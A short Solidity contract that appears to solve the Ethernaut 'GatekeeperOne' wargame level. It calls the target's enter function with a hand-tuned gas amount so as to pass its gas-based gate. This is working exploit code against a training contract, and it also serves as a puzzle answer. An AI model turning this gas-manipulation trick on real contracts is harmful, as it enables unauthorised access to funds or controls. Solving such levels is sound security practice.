pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./GatekeeperOne.sol";
import "hardhat/console.sol";

contract GatekeeperOneAttacker {
  using SafeMath for uint256;
  address public entrant;
  GatekeeperOne target;

  constructor(address _target) public {
    target = GatekeeperOne(_target);
  }

  function attack(bytes8 key) public {
    // target.enter(key);
    console.log("attack starts");
    uint256 gasToGive = 30000 - 5151 - 22;
    (bool result, ) = address(target).call.gas(gasToGive)(
      abi.encodeWithSignature("enter(bytes8)", key)
    );
    console.log("attack worked", result);
  }
}
